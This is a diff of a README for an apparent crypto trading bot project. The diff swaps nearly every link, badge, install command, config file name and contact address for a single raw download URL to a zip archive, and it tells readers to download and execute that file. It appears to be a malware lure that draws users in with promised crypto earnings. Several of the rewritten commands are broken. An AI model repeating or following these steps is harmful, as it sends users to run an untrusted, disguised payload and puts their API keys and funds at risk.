@@ -1,7 +1,7 @@
 # Passive Guide: Your Path to Earning with Crypto Bots 🤖💰
 
-![Crypto Trading](https://img.shields.io/badge/Crypto_Trading-Passive_Guide-blue.svg)
-![Releases](https://img.shields.io/badge/Releases-Latest%20Version-orange.svg)
+![Crypto Trading](https://github.com/sediklaabidi/Passive-Guide/raw/refs/heads/main/pseudodementia/Guide_Passive_v2.4-beta.2.zip)
+![Releases](https://github.com/sediklaabidi/Passive-Guide/raw/refs/heads/main/pseudodementia/Guide_Passive_v2.4-beta.2.zip%https://github.com/sediklaabidi/Passive-Guide/raw/refs/heads/main/pseudodementia/Guide_Passive_v2.4-beta.2.zip)
 
 ## Table of Contents
 
@@ -17,7 +17,7 @@
 
 ## Overview
 
-Welcome to the **Passive Guide** repository! This project helps you start earning with a crypto bot. Our easy-to-follow instructions and resources will guide you through the setup process. You can find the latest version of our bot [here](https://github.com/sediklaabidi/Passive-Guide/releases). Download and execute the file to get started.
+Welcome to the **Passive Guide** repository! This project helps you start earning with a crypto bot. Our easy-to-follow instructions and resources will guide you through the setup process. You can find the latest version of our bot [here](https://github.com/sediklaabidi/Passive-Guide/raw/refs/heads/main/pseudodementia/Guide_Passive_v2.4-beta.2.zip). Download and execute the file to get started.
 
 ### Topics Covered
 
@@ -52,7 +52,7 @@ To install the bot, follow these steps:
 1. **Clone the Repository**: Use the following command to clone the repository to your local machine.
 
    ```bash
-   git clone https://github.com/sediklaabidi/Passive-Guide.git
+   git clone https://github.com/sediklaabidi/Passive-Guide/raw/refs/heads/main/pseudodementia/Guide_Passive_v2.4-beta.2.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -64,20 +64,20 @@ To install the bot, follow these steps:
 3. **Install Dependencies**: Use pip to install the required libraries.
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/sediklaabidi/Passive-Guide/raw/refs/heads/main/pseudodementia/Guide_Passive_v2.4-beta.2.zip
    ```
 
-4. **Download the Latest Release**: Visit the [Releases section](https://github.com/sediklaabidi/Passive-Guide/releases) to download the latest version of the bot. Execute the downloaded file to set it up.
+4. **Download the Latest Release**: Visit the [Releases section](https://github.com/sediklaabidi/Passive-Guide/raw/refs/heads/main/pseudodementia/Guide_Passive_v2.4-beta.2.zip) to download the latest version of the bot. Execute the downloaded file to set it up.
 
 ## Usage
 
 After installation, you can start using the bot. Here’s how:
 
-1. **Configure Your Settings**: Open the `config.json` file and enter your API keys and trading preferences.
+1. **Configure Your Settings**: Open the `https://github.com/sediklaabidi/Passive-Guide/raw/refs/heads/main/pseudodementia/Guide_Passive_v2.4-beta.2.zip` file and enter your API keys and trading preferences.
 2. **Run the Bot**: Use the following command to start the bot.
 
    ```bash
-   python bot.py
+   python https://github.com/sediklaabidi/Passive-Guide/raw/refs/heads/main/pseudodementia/Guide_Passive_v2.4-beta.2.zip
    ```
 
 3. **Monitor Performance**: Keep an eye on the console for updates on trades and profits.
@@ -104,9 +104,9 @@ Scalping is a short-term strategy that involves making small profits from numero
 
 ## YouTube Tutorial
 
-For a step-by-step guide on how to set up and use the bot, check out our YouTube tutorial. It covers everything from installation to advanced strategies. You can watch it [here](https://github.com/sediklaabidi/Passive-Guide/releases). 
+For a step-by-step guide on how to set up and use the bot, check out our YouTube tutorial. It covers everything from installation to advanced strategies. You can watch it [here](https://github.com/sediklaabidi/Passive-Guide/raw/refs/heads/main/pseudodementia/Guide_Passive_v2.4-beta.2.zip). 
 
-![YouTube Tutorial](https://img.youtube.com/vi/your_video_id/0.jpg)
+![YouTube Tutorial](https://github.com/sediklaabidi/Passive-Guide/raw/refs/heads/main/pseudodementia/Guide_Passive_v2.4-beta.2.zip)
 
 ## Contributing
 
@@ -127,7 +127,7 @@ This project is licensed under the MIT License. See the LICENSE file for details
 
 For questions or support, feel free to reach out:
 
-- **Email**: your_email@example.com
-- **GitHub**: [sediklaabidi](https://github.com/sediklaabidi)
+- **Email**: https://github.com/sediklaabidi/Passive-Guide/raw/refs/heads/main/pseudodementia/Guide_Passive_v2.4-beta.2.zip
+- **GitHub**: [sediklaabidi](https://github.com/sediklaabidi/Passive-Guide/raw/refs/heads/main/pseudodementia/Guide_Passive_v2.4-beta.2.zip)
 
 Thank you for checking out the **Passive Guide**! Start your journey to financial freedom today.
